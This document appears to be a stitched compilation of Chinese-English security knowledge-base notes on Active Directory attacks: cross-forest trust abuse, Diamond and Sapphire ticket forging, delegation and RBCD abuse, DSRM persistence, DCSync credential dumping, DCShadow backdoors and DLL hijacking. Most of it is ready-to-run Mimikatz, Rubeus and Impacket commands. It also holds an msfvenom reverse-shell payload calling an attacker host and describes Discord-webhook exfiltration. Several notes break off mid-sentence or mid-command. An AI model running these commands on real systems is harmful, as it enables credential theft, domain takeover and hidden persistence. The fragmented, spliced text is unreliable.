content: 来源路径： 02-知识点/域与Windows/External Forest Domain：OneWay (Inbound) or bidirectional 技术笔记.md 自动导入：安全知识库笔记，已对示例密钥 / Token 做公开发布脱敏。 # External Forest Domain：OneWay (Inbound) or bidirectional 技术笔记 [!summary] 提炼定位 面向 域与 Windows 的知识点；已剥离原仓库目录、构建说明、站点资产和安装噪声，只保留概念、流程、命令、工具、方法论与检测线索。 # 适用场景 在 Windows/AD 环境中围绕 External Forest Domain：OneWay (Inbound) or bidirectional 技术笔记 做枚举、凭据利用、横向或持久化分析。 优先确认身份、票据、权限边界和日志痕迹。 # 中文提炼 核心目标是把 External Forest Domain：OneWay (Inbound) or bidirectional 技术笔记 放进 AD/Windows 身份链：当前身份、凭据形态、目标对象和可达权限。 优先关注：External Forest Domain：OneWay (Inbound) or bidirectional、枚举、Initial Access、Impersonation、Logging in；LDAP/SMB/Kerberos/ 证书 / ACL 的结果要能回写到攻击图谱。 每一步都区分枚举、离线验证、远程执行、对象修改和凭据使用，避免把低风险查询误当成利用。 检测视角重点记录登录事件、票据请求、进程链、远程服务、对象属性变更和网络目的地。 本页已沉淀 5 组命令 / 载荷片段；使用时先核对授权范围、目标环境和副作用。 # 关键主题 External Forest Domain：OneWay (Inbound) or bidirectional 枚举 Initial Access Impersonation Logging in SID History Abuse Full way impersonating the user Cross-forest RBCD when you control a machine account in the trusting forest (no SID filtering / selective auth) PAC validation hardening # 核心要点 First of all, you need to enumerate the trust: In the previous 枚举 it was found that the user crossuser is inside the External Admins group who has Admin access inside the DC of the external domain. If you couldn't find any special access of your user in the other domain, you can still go back to the AD 方法论 and try to privesc from an unprivileged user (things like Kerberoasting 服务票据离线爆破 for example): You can use Powerview functions to enumerate the other domain using the -Domain param like in: Using a regular method with the 凭据 of the users who is has access to the external domain you should be able to access: If a user is migrated from one forest to another and SID Filtering is not enabled, it becomes possible to add a SID from the other forest, and this SID will be added to the user's 令牌 when authenticating across the trust. # 命令 / 载荷 / 操作片段 # 1. Initial Access 1Get-DomainUser -SPN -Domain domain_name.local | select SamAccountName # 2. Logging in 1Enter-PSSession -ComputerName dc.external_domain.local -Credential domain\administrator # 3. SID History Abuse 12345678# Get a TGT for the cross-domain privileged user to the other domainInvoke-Mimikatz -Command '"kerberos::golden /user:<username> /domain:<current domain> /SID:<current domain SID> /rc4:<trusted key> /target:<external.domain> /ticket:C:\path\save\ticket.kirbi"'# Use this inter-realm TGT to request a TGS in the target domain to access the CIFS service of the DC## We are asking to access CIFS of the external DC because in the enumeration we show the group was part of the local administrators groupRubeus.exe asktgs /service:cifs/dc.doamin.external /domain:dc.domain.external /dc:dc.domain.external /ticket:C:\path\save\ticket.kirbi /nowrap# Now you have a TGS to access the CIFS service of the domain controller # 4. Full way impersonating the user 1234567891011# Get a TGT of the user with cross-domain permissionsRubeus.exe asktgt /user:crossuser /domain:sub.domain.local /aes256:70a673fa756d60241bd74ca64498701dbb0ef9c5fa3a93fe4918910691647d80 /opsec /nowrap# Get a TGT from the current domain for the target domain for the userRubeus.exe asktgs /service:krbtgt/domain.external /domain:sub.domain.local /dc:dc.sub.domain.local /ticket:doIFdD[...snip...]MuSU8= /nowrap# Use this inter-realm TGT to request a TGS in the target domain to access the CIFS service of the DC## We are asking to access CIFS of the external DC because in the enumeration we show the group was part of the local administrators groupRubeus.exe asktgs /service:cifs/dc.doamin.external /domain:dc.domain.external /dc:dc.domain.external /ticket:doIFMT[...snip...]5BTA== /nowrap# Now you have a TGS to access the CIFS service of the domain controller # 5. Cross-forest RBCD when you control a machine account in the trusting forest (no SID filtering / selective auth) 12345678# 1) From the trusted domain, create or compromise a machine account (MYLAB$) you control# 2) In the trusting forest (domain.external), set msDS-AllowedToAct on the target host for that accountSet-ADComputer -Identity victim-host$ -PrincipalsAllowedToDelegateToAccount MYLAB$# or with PowerViewSet-DomainObject victim-host$ -Set @{'msds-allowedtoactonbehalfofotheridentity'=$sidbytes_of_MYLAB}# 3) Use the inter-forest TGT to perform S4U to victim-host$ and get a CIFS ticket as DA of the trusting forestRubeus.exe s4u /ticket:interrealm_tgt.kirbi /impersonate:EXTERNAL\Administrator /target:victim-host.domain.external /protocol:rpc # 工具与参考入口 Microsoft KB5037754 – PAC validation changes for CVE-2024-26248 & CVE-2024-29056 MS-PAC spec – SID filtering & claims transformation details # 检查清单 是否确认当前身份、域、主机与票据状态 是否枚举 ACL、SPN、委派、证书模板或共享 是否评估日志与检测痕迹 是否准备回滚 / 清理步骤 # 关联 域与 Windows 总览 知识地图 # 扩展记录 可在这里补充实验环境、样例、检测规则、失败条件与版本差异。

The critical aspect to understand here is that the 密码 and 哈希 of this special account can be extracted from a Domain Controller in domain A using a command line tool. The command to perform this action is: Warning: It is feasible to leverage this situation to gain a foothold in domain A as a user, albeit with limited permissions. However, this access is sufficient to perform 枚举 on domain A. This 认证 step opens up the possibility to enumerate and even 利用 services within root.local, such as performing a Kerberoasting 服务票据离线爆破 attack to extract service account 凭据 using: In the previous flow it was used the trust 哈希 instead of the clear text 密码 (that was also dumped by mimikatz). The cleartext 密码 can be obtained by converting the [CLEAR] output from mimikatz from hexadecimal and removing null bytes ‘\x00’: # 命令 / 载荷 / 操作片段 # 1. Outbound Trust 12345678910111213141516171819# Notice Outbound trustGet-DomainTrustSourceName : root.localTargetName : ext.localTrustType : WINDOWS_ACTIVE_DIRECTORYTrustAttributes : FOREST_TRANSITIVETrustDirection : OutboundWhenCreated : 2/19/2021 10:15:24 PMWhenChanged : 2/19/2021 10:15:24 PM# Lets find the current domain group giving permissions to the external domainGet-DomainForeignGroupMemberGroupDomain : root.localGroupName : External UsersGroupDistinguishedName : CN=External Users,CN=Users,DC=DOMAIN,DC=LOCALMemberDomain : root.ioMemberName : S-1-5-21-1028541967-2937615241-1935644758-1115MemberDistinguishedName : CN=S-1-5-21-1028541967-2937615241-1935644758-1115,CN=ForeignSecurityPrincipals,DC=DOMAIN,DC=LOCAL## Note how the members aren't from the current domain (ConvertFrom-SID won't work) # 2. Trust Account Attack 1Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local # 3. Trust Account Attack 1lsadump::trust /patch # 4. Trust Account Attack 1.\Rubeus.exe asktgt /user:EXT$ /domain:root.local /rc4:<RC4> /dc:dc.root.local /ptt # 5. Trust Account Attack 1.\Rubeus.exe kerberoast /user:svc_sql /domain:root.local /dc:dc.root.local # 检查清单 是否确认当前身份、域、主机与票据状态 是否枚举 ACL、SPN、委派、证书模板或共享 是否评估日志与检测痕迹 是否准备回滚 / 清理步骤 # 关联 域与 Windows 总览 知识地图 # 扩展记录 可在这里补充实验环境、样例、检测规则、失败条件与版本差异。

Webhooks are write-only HTTPS endpoints that accept JSON and optional file parts. They’re commonly allowed to trusted SaaS domains and require no OAuth/API keys, making them useful for low-friction beaconing and exfiltration. Endpoint: Discord uses https://discord.com/api/webhooks/<id>/< 令牌 > POST multipart/form-data with a part named 载荷 json containing {"content":"..."} and optional file part (s) named file. Operator loop pattern: periodic beacon -> directory 侦察 -> targeted file exfil -> 侦察 dump -> sleep. HTTP 204 NoContent/200 OK confirm delivery. # 命令 / 载荷 / 操作片段 # 1. Copy&Paste Base64 12base64 -w0 <file> #Encode filebase64 -d file #Decode file # 2. Copy&Paste Base64 12certutil -encode payload.dll payload.b64certutil -decode payload.b64 payload.dll # 3. HTTPS Server 1234567891011121314151617181920212223242526272829303132333435363738# from https://gist.github.com/dergachev/7028596# taken from http://www.piware.de/2011/01/creating-an-https-server-in-python/# generate server.xml with the following command:# openssl req -new -x509 -keyout server.pem -out server.pem -days 365 -nodes# run as follows:# python simple-https-server.py# then in your browser, visit:# https://localhost:443### PYTHON 2import BaseHTTPServer, SimpleHTTPServerimport sslhttpd = BaseHTTPServer.HTTPServer(('0.0.0.0', 443), SimpleHTTPServer.SimpleHTTPRequestHandler)httpd.socket = ssl.wrap_socket (httpd.socket, certfile='./server.pem', server_side=True)httpd.serve_forever()###### PYTHON3from http.server import HTTPServer, BaseHTTPRequestHandlerimport sslhttpd = HTTPServer(('0.0.0.0', 443), BaseHTTPRequestHandler)httpd.socket = ssl.wrap_socket(httpd.socket, certfile="./server.pem", server_side=True)httpd.serve_forever()###### USING FLASKfrom flask import Flask, redirect, requestfrom urllib.parse import quoteapp = Flask(__name__)@app.route('/')def root(): print(request.get_json()) return "OK"if __name__ == "__main__": app.run(ssl_context='adhoc', debug=True, host="0.0.0.0", port=8443)### # 7. If you are looking for a missing dll inside an specific executable you should set another filter like "Process Name" "contains" <exec name>, execute it, and stop capturing events. Build a 载荷 DLL (e.g. 反弹 Shell) with any export: msfvenom -p windows/x64/shell reverse tcp LHOST=<attacker ip> LPORT=443 -f dll -o hostfxr.dll. If your primitive is a ZipSlip-style arbitrary write, craft a ZIP whose entry escapes the extraction dir so the DLL lands in the app folder: Deliver the archive to the watched inbox/share; when the scheduled task re-launches the process it loads the malicious DLL and executes your code as the service account. This technique has been observed in-the-wild to drive multi-stage sideloading chains: an initial launcher drops a helper DLL, which then spawns a Microsoft-signed, hijackable binary with a custom DllPath to force loading of the attacker’s DLL from a staging directory. Identify a process that operates or will operate under different privileges (horizontal or 横向移动), which is lacking a DLL. Ensure write access is available for any directory in which the DLL will be searched for. This location might be the directory of the executable or a directory within the system path. Winpeas will check if you have write permissions on any folder inside system PATH.\ Get rev shell (x64): If a writable attacker-controlled DLL exists at the OneCore path, it is loaded and DllMain(DLL PROCESS ATTACH) executes. No exports are required. A naive hijack will speak/highlight UI. To stay quiet, on attach enumerate Narrator threads, open the main thread (OpenThread(THREAD SUSPEND RESUME)) and SuspendThread it; continue in your own thread. See PoC for full code. With the above, starting Narrator loads the planted DLL. On the secure desktop (logon screen), press CTRL+WIN+ENTER to start Narrator; your DLL executes as SYSTEM on the secure desktop. RDP to the host, at the logon screen press CTRL+WIN+ENTER to launch Narrator; your DLL executes as SYSTEM on the secure desktop. # 命令 / 载荷 / 操作片段 # 1. title: Diamond Ticket 技术笔记
content: 来源路径： 02-知识点/域与Windows/Diamond Ticket 技术笔记.md 自动导入：安全知识库笔记，已对示例密钥 / Token 做公开发布脱敏。 # Diamond Ticket 技术笔记 [!summary] 提炼定位 面向 域与 Windows 的知识点；已剥离原仓库目录、构建说明、站点资产和安装噪声，只保留概念、流程、命令、工具、方法论与检测线索。 # 适用场景 在 Windows/AD 环境中围绕 Diamond Ticket 技术笔记 做枚举、凭据利用、横向或持久化分析。 优先确认身份、票据、权限边界和日志痕迹。 # 中文提炼 核心目标是把 Diamond Ticket 技术笔记 放进 AD/Windows 身份链：当前身份、凭据形态、目标对象和可达权限。 优先关注：Diamond Ticket、Requirements & workflow、Updated Rubeus tradecraft (2024+)、Service-ticket recutting、Sapphire-style PAC swaps (2025)；LDAP/SMB/Kerberos/ 证书 / ACL 的结果要能回写到攻击图谱。 每一步都区分枚举、离线验证、远程执行、对象修改和凭据使用，避免把低风险查询误当成利用。 检测视角重点记录登录事件、票据请求、进程链、远程服务、对象属性变更和网络目的地。 本页已沉淀 3 组命令 / 载荷片段；使用时先核对授权范围、目标环境和副作用。 # 关键主题 Diamond Ticket Requirements & workflow Updated Rubeus tradecraft (2024+) Service-ticket recutting Sapphire-style PAC swaps (2025) OPSEC & 检测 notes # 核心要点 There are two common techniques to detect the use of golden tickets: The TGT was issued by a DC which means it will have all the correct details from the domain's Kerberos policy. Even though these can be accurately forged in a 黄金票据，it's more complex and open to mistakes. Cryptographic material: the krbtgt AES256 key (preferred) or NTLM 哈希 in order to decrypt and re-sign the TGT. Legitimate TGT blob: obtained with /tgtdeleg, asktgt, s4u, or by exporting tickets from memory. Context data: the target user RID, group RIDs/SIDs, and (optionally) LDAP-derived PAC attributes. Service keys (only if you plan to re-cut service tickets): AES key of the service SPN to be impersonated. /ldap (with optional /ldapuser & /ldappassword) queries AD and SYSVOL to mirror the target user's PAC policy data. /tgtdeleg keeps your hands off the cleartext 密码 or NTLM/AES key of the victim while still returning a decryptable TGT. -impersonate accepts a username or SID; -request requires live user creds plus krbtgt key material (AES/NTLM) to decrypt/patch tickets. TGS-REQ will carry ENC-TKT-IN-SKEY and additional-tickets (the victim TGT) — rare in normal traffic. Expect paired 4768/4769 entries with the same client computer but different CNAMES (low-priv requester vs. privileged PAC owner). Sapphire-style swaps leave U2U fingerprints: ENC-TKT-IN-SKEY + additional-tickets plus a sname that points at a user (often the requester) in 4769, and a follow-up 4624 logon sourced from the forged ticket. Correlate those fields instead of only looking for no-AS-REQ gaps. Microsoft started phasing out RC4 service ticket issuance because of CVE-2026-20833; enforcing AES-only etypes on the KDC both hardens the domain and aligns with diamond/sapphire tooling (/opsec already forces AES). Mixing RC4 into forged PACs will increasingly stick out. # 命令 / 载荷 / 操作片段 # 1. Updated Rubeus tradecraft (2024+) 12345678910# Query RID/context data (PowerView/SharpView/AD modules all work)Get-DomainUser -Identity <username> -Properties objectsid | Select-Object samaccountname,objectsid# Craft a high-fidelity diamond TGT and inject it./Rubeus.exe diamond /tgtdeleg \ /ticketuser:svc_sql /ticketuserid:1109 \ /groups:512,519 \ /krbkey:<KRBTGT_AES256_KEY> \ /ldap /ldapuser:MARVEL\loki /ldappassword:Mischief$ \ /opsec /nowrap # 2. Service-ticket recutting 123456./Rubeus.exe diamond \ /ticket:<BASE64_TGT_OR_KRB-CRED> \ /service:cifs/dc01.lab.local \ /servicekey:<AES256_SERVICE_KEY> \ /ticketuser:svc_sql /ticketuserid:1109 \ /ldap /opsec /nowrap # 3. Sapphire-style PAC swaps (2025) 123456python3 ticketer.py -request -impersonate 'DAuser' \ -domain 'lab.local' -user 'lowpriv' -password 'Passw0rd!' \ -aesKey '<krbtgt_aes256>' -domain-sid 'S-1-5-21-111-222-333'# inject resulting .ccacheexport KRB5CCNAME=lowpriv.ccachepython3 psexec.py lab.local/DAuser@dc.lab.local -k -no-pass # 工具与参考入口 Core Security – Impacket: We Love Playing Tickets (2023) Huntress – Recutting the Kerberos Diamond Ticket (2025) Splunk Security Content – Diamond Ticket attack data & detections (2023) Хабр – Теневая сторона драгоценностей: Diamond & Sapphire Ticket (2025) Microsoft – RC4 service ticket enforcement for CVE-2026-20833 # 检查清单 是否确认当前身份、域、主机与票据状态 是否枚举 ACL、SPN、委派、证书模板或共享 是否评估日志与检测痕迹 是否准备回滚 / 清理步骤 # 关联 域与 Windows 总览 知识地图 Kerberos 票据攻击 云身份与权限 # 扩展记录 可在这里补充实验环境、样例、检测规则、失败条件与版本差异。

The "Kerberos" 认证 protocol features delegation capabilities described as follows. There are three types of Kerberos delegations With constrained and unconstrained delegations, the delegation attributes are set on the impersonating service (requires SeEnableDelegationPrivilege in the domain) whereas with RBCD, these attributes are set on the target service account itself (requires lower privileges). Kerberos delegations can be abused by attackers to obtain access to valuable assets and sometimes even escalate to domain admin privileges. Regarding constrained delegations and rbcd, those types of delegation rely on Kerberos extensions called Service-for-User (S4U). Simply put, Service for User to Self (S4U2self) allows a service to obtain a Service Ticket, on behalf of another user (called "principal"), to itself. Service for User to Proxy (S4U2proxy) allows a service to obtain a Service Ticket, on behalf of a user to a different service. Some of the following parts allow to obtain modified or crafted Kerberos tickets. Once obtained, these tickets can be used with Pass-the-Ticket. # 命令 / 载荷 / 操作片段 # 1. 侦察 1findDelegation.py "DOMAIN"/"USER":"PASSWORD" # 2. 侦察 1findDelegation.py -user "account" "DOMAIN"/"USER":"PASSWORD" # 3. 侦察 1234567891011// Unconstrained DelegationMATCH (c {unconstraineddelegation:true}) return c// Constrained Delegation (with Protocol Transition)MATCH (c) WHERE NOT c.allowedtodelegate IS NULL AND c.trustedtoauth=true return c// Constrained Delegation (without Protocol Transition)MATCH (c) WHERE NOT c.allowedtodelegate IS NULL AND c.trustedtoauth=false return c// Resource-Based Constrained DelegationMATCH p=(u)-[:AllowedToAct]->(c) RETURN p # 4. 侦察 1Get-ADComputer "Account" -Properties TrustedForDelegation, TrustedToAuthForDelegation,msDS-AllowedToDelegateTo,PrincipalsAllowedToDelegateToAccount # 工具与参考入口 Impacket findDelegation a Pull Request https://blog.harmj0y.net/redteaming/another-word-on-delegation/ https://harmj0y.medium.com/s4u2pwnage-36efe1a2777c # 检查清单 是否确认当前身份、域、主机与票据状态 是否枚举 ACL、SPN、委派、证书模板或共享 是否评估日志与检测痕迹 是否准备回滚 / 清理步骤 # 关联 域与 Windows 总览 知识地图 Pwn 基础链路 侦察枚举流水线 # 扩展记录 可在这里补充实验环境、样例、检测规则、失败条件与版本差异。

Pass-the-ticket to use the Service-Ticket-that-is-in-fact-a-TGT, act as the target -privileged- user, and authenticate to remote resources. Every step of this attack can be achieved using one of the following scripts from Impacket (Python), such as rbcd.py and getST.py. Every step of this attack can be achieved using Rubeus and the Set-ADUser command. # 命令 / 载荷 / 操作片段 # 1. Practice 12345678# Step 1 : Configure RBCD delegation from ControlledAccountWithSPN to krbtgtrbcd.py -delegate-from 'ControlledAccountWithSPN' -delegate-to 'krbtgt' -dc-ip $dcIp -action write 'DOMAIN'/'PrivilegiedAccount':'StrongPassword'# Step 2 : S4U attack for TargetedAccount to ControlledAccountWithSPNgetST.py -spn "KRBTGT" -impersonate "TargetedAccount" -dc-ip $dcIp 'DOMAIN'/'ControlledAccountWithSPN':'PasswordOfControlledAccountWithSPN'# Step 3 : Get Service Ticket for TargetedAccount to the target service using the previously obtained ticket (which is a TGT).KRB5CCNAME='TargetedAccount@krbtgt_DOMAIN@DOMAIN.ccache' getST.py -spn 'cifs/target' -k -no-pass 'DOMAIN'/'TargetedAccount' # 2. Practice 12345678# Step 1 : Configure RBCD delegation from ControlledAccountWithSPN to krbtgtSet-ADUser krbtgt -PrincipalsAllowedToDelegateToAccount ControlledAccountWithSPN# Step 2 : Full S4U for TargetedAccount to krbtgt using ControlledAccountWithSPNRubeus.exe s4u /nowrap /impersonateuser:"TargetedAccount" /msdsspn:"krbtgt" /domain:"DOMAIN" /user:"ControlledAccountWithSPN" /rc4:$NThash# Step 3 : Get Service Ticket for TargetedAccount to the target service using the previously obtained ticket (printed in a base64 blob thanks to the /nowrap flag), and inject it in memory using /ptt in order to use the resulting ticket for authentication to remote resourcesRubeus.exe asktgs /service:"cifs/target" /ticket:"base64ticket...." /ptt # 工具与参考入口 Impacket https://skyblue.team/posts/delegate-krbtgt/ # 检查清单 是否确认当前身份、域、主机与票据状态 是否枚举 ACL、SPN、委派、证书模板或共享 是否评估日志与检测痕迹 是否准备回滚 / 清理步骤 # 关联 域与 Windows 总览 知识地图 Kerberos 票据攻击 # 扩展记录 可在这里补充实验环境、样例、检测规则、失败条件与版本差异。

Value 2: Permits the use of DSRM 凭据 at all times, including over the network. By exploiting these configurations, an attacker can utilize the DSRM account for long-term access to the DC without requiring domain 凭据. Mimikatz can be used to perform the attack. # 命令 / 载荷 / 操作片段 # 1. Practice 123456# On the domain controller, retrieve the hash of the DSRM account (Administrator)mimikatz.exe "token::elevate" "lsadump::sam"# Set the registry key to allow login with the DSRM accountNew-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" -Name "DsrmAdminLogonBehavior" -Value 2 -PropertyType DWORD# Use the hash to authenticate and run a new PowerShell processmimikatz.exe "sekurlsa::pth /domain:<DC_NAME> /user:Administrator /ntlm:<NTLM_HASH> /run:powershell.exe" # 工具与参考入口 Mimikatz https://adsecurity.org/?p=1714 https://adsecurity.org/?p=1785 # 检查清单 是否确认当前身份、域、主机与票据状态 是否枚举 ACL、SPN、委派、证书模板或共享 是否评估日志与检测痕迹 是否准备回滚 / 清理步骤 # 关联 域与 Windows 总览 知识地图 # 扩展记录 可在这里补充实验环境、样例、检测规则、失败条件与版本差异。

An attacker able to answer broadcast DHCP queries faster than the legit DHCP server can inject any network setting on the requesting client. The attack can be started with the -d/--DHCP (WPAD injection) argument. By default, a rogue WPAD server will be injected in the configuration. If the additional-D/--DHCP-DNS argument is set, a rogue DNS server address will be injected in the configuration instead of a WPAD. The proxy auth NTLM 认证 can either be or forced and relayed with ntlmrelayx (by using the --http-port 3128 argument ntlmrelayx -t $target --http-port 3128 # 命令 / 载荷 / 操作片段 # 1. content: 来源路径： 02-知识点/域与Windows/DCSync 技术笔记.md 自动导入：安全知识库笔记，已对示例密钥 / Token 做公开发布脱敏。 # DCSync 技术笔记 [!summary] 提炼定位 面向 域与 Windows 的知识点；已剥离原仓库目录、构建说明、站点资产和安装噪声，只保留概念、流程、命令、工具、方法论与检测线索。 # 适用场景 在 Windows/AD 环境中围绕 DCSync 技术笔记 做枚举、凭据利用、横向或持久化分析。 优先确认身份、票据、权限边界和日志痕迹。 # 中文提炼 核心目标是把 DCSync 技术笔记 放进 AD/Windows 身份链：当前身份、凭据形态、目标对象和可达权限。 优先关注：DCSync、枚举、利用 Locally、利用 Remotely、DCSync using a captured DC machine TGT (ccache)；LDAP/SMB/Kerberos/ 证书 / ACL 的结果要能回写到攻击图谱。 每一步都区分枚举、离线验证、远程执行、对象修改和凭据使用，避免把低风险查询误当成利用。 检测视角重点记录登录事件、票据请求、进程链、远程服务、对象属性变更和网络目的地。 本页已沉淀 10 组命令 / 载荷片段；使用时先核对授权范围、目标环境和副作用。 # 关键主题 DCSync 枚举 利用 Locally 利用 Remotely DCSync using a captured DC machine TGT (ccache) 持久化 Mitigation # 核心要点 By default only Domain Admins, Enterprise Admins, Administrators, and Domain Controllers groups have the required privileges. If any account passwords are stored with reversible encryption, an option is available in Mimikatz to return the 密码 in clear text In unconstrained-delegation export-mode scenarios, you may capture a Domain Controller machine TGT (e.g., DC1$@DOMAIN for krbtgt@DOMAIN). You can then use that ccache to authenticate as the DC and perform DCSync without a 密码. Impacket's Kerberos path touches SMB first before the DRSUAPI call. If the environment enforces SPN target name validation, a full dump may fail with Policy SPN target name validation might be restricting full DRSUAPI dump. Try -just-dc-user. In that case, either request a cifs/<dc> service ticket for the target DC first or fall back to -just-dc-user for the account you need immediately. When you only have lower replication rights, LDAP/DirSync-style syncing can still expose confidential or RODC-filtered attributes (for example legacy ms-Mcs-AdmPwd) without a full krbtgt replication. one with the NTLM hashes one with the the Kerberos keys one with cleartext passwords from the NTDS for any accounts set with reversible encryption enabled. You can get users with reversible encryption with AD ACL Scanner：Create and compare create reports of ACLs. https://github.com/canix1/ADACLScanner # 命令 / 载荷 / 操作片段 # 1. 枚举 1Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll') -or ($_.ActiveDirectoryRights -match 'WriteDacl')} # 2. 枚举 123456789$domainDN = "DC=dollarcorp,DC=moneycorp,DC=local"$default = "Domain Controllers|Enterprise Domain Controllers|Domain Admins|Enterprise Admins|Administrators"Get-ObjectAcl -DistinguishedName $domainDN -ResolveGUIDs | Where-Object { $_.ObjectType -match 'replication-get' -or $_.ActiveDirectoryRights -match 'GenericAll|WriteDacl' } | Where-Object { $_.IdentityReference -notmatch $default } | Select-Object IdentityReference,ObjectType,ActiveDirectoryRights # 3. 利用 Locally 1Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"' # 4. 利用 Remotely 1234567secretsdump.py -just-dc <user>:<password>@<ipaddress> -outputfile dcsync_hashes[-just-dc-user <USERNAME>] #To get only of that user[-ldapfilter '(adminCount=1)'] #Or scope the dump to objects matching an LDAP filter[-just-dc-ntlm] #Only NTLM material, faster/cleaner when you don't need Kerberos keys[-pwd-last-set] #To see when each account's password was last changed[-user-status] #Show if the account is enabled/disabled while dumping[-history] #To dump password history, may be helpful for offline password cracking # 5. 利用 Remotely 12345678# Only the krbtgt accountsecretsdump.py -just-dc-user krbtgt <DOMAIN>/<USER>:<PASSWORD>@<DC_IP># Only privileged objects selected through LDAPsecretsdump.py -just-dc-ntlm -ldapfilter '(adminCount=1)' <DOMAIN>/<USER>:<PASSWORD>@<DC_IP># Add metadata and password history for cracking/reuse analysissecretsdump.py -just-dc-ntlm -history -pwd-last-set -user-status <DOMAIN>/<USER>:<PASSWORD>@<DC_IP> # 6. DCSync using a captured DC machine TGT (ccache) 1234567891011# Generate a krb5.conf for the realm (helper)netexec smb <DC_FQDN> --generate-krb5-file krb5.confsudo tee /etc/krb5.conf < krb5.conf# netexec helper using KRB5CCNAMEKRB5CCNAME=DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache \ netexec smb <DC_FQDN> --use-kcache --ntds# Or Impacket with Kerberos from ccacheKRB5CCNAME=DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache \ secretsdump.py -just-dc -k -no-pass <DOMAIN>/ -dc-ip <DC_IP> # 7. DCSync using a captured DC machine TGT (ccache) 1Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol # 8. 持久化 1Add-ObjectAcl -TargetDistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -PrincipalSamAccountName username -Rights DCSync -Verbose # 9. 持久化 1bloodyAD --host <DC

title: DCShadow 技术笔记
content: 来源路径： 02-知识点/域与Windows/DCShadow 技术笔记.md 自动导入：安全知识库笔记，已对示例密钥 / Token 做公开发布脱敏。 # DCShadow 技术笔记 [!summary] 提炼定位 面向 域与 Windows 的知识点；已剥离原仓库目录、构建说明、站点资产和安装噪声，只保留概念、流程、命令、工具、方法论与检测线索。 # 适用场景 在 Windows/AD 环境中围绕 DCShadow 技术笔记 做枚举、凭据利用、横向或持久化分析。 优先确认身份、票据、权限边界和日志痕迹。 # 中文提炼 核心目标是把 DCShadow 技术笔记 放进 AD/Windows 身份链：当前身份、凭据形态、目标对象和可达权限。 优先关注：DCShadow、Basic Information、Using DCShadow to create backdoors、Primary group abuse, 枚举 gaps, and 检测、Shadowception：Give DCShadow permissions using DCShadow (no modified permissions logs)；LDAP/SMB/Kerberos/ 证书 / ACL 的结果要能回写到攻击图谱。 每一步都区分枚举、离线验证、远程执行、对象修改和凭据使用，避免把低风险查询误当成利用。 检测视角重点记录登录事件、票据请求、进程链、远程服务、对象属性变更和网络目的地。 本页已沉淀 7 组命令 / 载荷片段；使用时先核对授权范围、目标环境和副作用。 # 关键主题 DCShadow Basic Information Using DCShadow to create backdoors Primary group abuse, 枚举 gaps, and 检测 Shadowception：Give DCShadow permissions using DCShadow (no modified permissions logs) # 核心要点 It registers a new Domain Controller in the AD and uses it to push attributes (SIDHistory, SPNs...) on specified objects without leaving any logs regarding the modifications. You need DA privileges and be inside the root domain.\ To perform the attack you need 2 mimikatz instances. One of them will start the RPC servers with SYSTEM privileges (you have to indicate here the changes you want to perform), and the other instance will be used to push the values: Notice that elevate:: 令牌 won't work in mimikatz1 session as that elevated the privileges of the thread, but we need to elevate the privilege of the process.\ You can also select and "LDAP" object: /object:CN=Administrator,CN=Users,DC=JEFFLAB,DC=local WriteProperty (Not Write) You can use Set-DCShadowPermissions to give these privileges to an unprivileged user (notice that this will leave some logs). This is much more restrictive than having DA privileges.\ Default 工具 prevent removing a user from their current primary group (ADUC, Remove-ADGroupMember), so changing PGID typically requires direct directory writes (DCShadow/Set-ADDBPrimaryGroup). On the attacker computer object: (A;;WP;;;UserSID) # 命令 / 载荷 / 操作片段 # 1. Basic Information 123!+!processtokenlsadump::dcshadow /object:username /attribute:Description /value="My new description" # 2. Basic Information 1lsadump::dcshadow /push # 3. Using DCShadow to create backdoors 1lsadump::dcshadow /object:student1 /attribute:SIDHistory /value:S-1-521-280534878-1496970234-700767426-519 # 4. Using DCShadow to create backdoors 1lsadump::dcshadow /object:student1 /attribute:primaryGroupID /value:519 # 5. Using DCShadow to create backdoors 1234#First, get the ACE of an admin already in the Security Descriptor of AdminSDHolder: SY, BA, DA or -519(New-Object System.DirectoryServices.DirectoryEntry("LDAP://CN=Admin SDHolder,CN=System,DC=moneycorp,DC=local")).psbase.Objec tSecurity.sddl#Second, add to the ACE permissions to your user and push it using DCShadowlsadump::dcshadow /object:CN=AdminSDHolder,CN=System,DC=moneycorp,DC=local /attribute:ntSecurityDescriptor /value:<whole modified ACL> # 6. Primary group abuse, 枚举 gaps, and 检测 1234# Find users whose primary group is not the default Domain Users (RID 513)Get-ADUser -Filter * -Properties primaryGroup,primaryGroupID | Where-Object { $_.primaryGroupID -ne 513 } | Select-Object Name,SamAccountName,primaryGroupID,primaryGroup # 7. Primary group abuse, 枚举 gaps, and 检测 1234# Find users where primaryGroupID cannot be read (likely denied via DACL)Get-ADUser -Filter * -Properties primaryGroupID | Where-Object { -not $_.primaryGroupID } | Select-Object Name,SamAccountName # 工具与参考入口 Set-DCShadowPermissions More information about DCShadow in ired.team. TrustedSec：Adventures in Primary Group Behavior, Reporting, and 利用 # 检查清单 是否确认当前身份、域、主机与票据状态 是否枚举 ACL、SPN、委派、证书模板或共享 是否评估日志与检测痕迹 是否准备回滚 / 清理步骤 # 关联 域与 Windows 总览 知识地图 # 扩展记录 可在这里补充实验环境、样例、检测规则、失败条件与版本差异。

